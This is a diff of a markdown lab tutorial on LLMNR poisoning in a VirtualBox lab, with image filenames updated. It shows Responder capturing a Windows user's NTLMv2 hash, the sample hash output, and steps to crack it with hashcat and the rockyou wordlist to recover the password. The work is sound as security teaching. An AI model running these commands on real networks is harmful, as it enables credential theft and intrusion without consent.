@@ -78,7 +78,7 @@ Both machines on same VirtualBox Host-Only network.
 ```bash
 ip a
 ```
-![Output](images/step-1.png)
+![Output](images/step1.png)
 
 ## Output:
 ```
@@ -102,7 +102,7 @@ sudo responder -I eth0 -dwv
 ```
 Responder will now listen on the network and wait for someone to broadcast a name request.
 
-![Responder Output](images/step-2.png)
+![Responder Output](images/step2.png)
 
 
 ### Step 3 — Trigger from Victim Machine
@@ -111,7 +111,7 @@ On Windows victim, open File Explorer and type:
 ```
 \\fakeshare
 ```
-![Responder Output](images/step-3.png)
+![Responder Output](images/step3-1.png)
 
 Windows tries DNS → fails → broadcasts LLMNR → Responder catches it.
 
@@ -123,18 +123,39 @@ Windows tries DNS → fails → broadcasts LLMNR → Responder catches it.
 [SMB] NTLMv2-SSP Username : VICTIM-2\karim
 [SMB] NTLMv2-SSP Hash     : karim::VICTIM-2:9265e4bef71c4923:19C4EB1DD7F5B53D853808B81F0EBCE4:010100000000000000CFC35AC5E6DC0135AE1EB1E9966109000000000200080036005A .... (full hash)...
 ```
-![Responder Output](images/step_3.png)
+![Responder Output](images/step3-2.png)
 
 ### Step 4 — Capture the Hash
 
+Copy the Hash
+
+![Responder Output](images/step4-1.png)
+
+Then on attacker terminal, type
+
 ```bash
-cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.5.136.txt > hash.txt
+nano hash.txt
 ```
+Now hit Enter button
+A nano text editor will open. Paste the Hash here.
+Then press Ctrl+x, y, Enter
+
+![](images/step4-2.png)
+
 
 ### Step 5 — Crack the Hash
 
 ```bash
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+```
+|             Flag                 |                   Meaning                     |
+| -------------------------------- | --------------------------------------------- |
+| hashcat                          | Password cracking tool                        |
+| -m 5600                          | Hash type (NTLMv2 hash mode)                  |
+| hash.txt                         | File containing captured hashes               |
+| /usr/share/wordlists/rockyou.txt | Wordlist used for dictionary attack (rockyou) |
 ```
 
 ## Result:
@@ -149,6 +170,8 @@ KARIM::VICTIM-2:08c4e1b5073681c1:7acce8f5708e0b1ea3bcbcf99f26fa01:10101000000000
 0000050006002000000000800045005300350033004a0083003......(full hash).....:Password1         
                                                                                    
 ```
+![Responder Output](images/step4-3.png)
+
 
 ## Defense & Mitigation
 
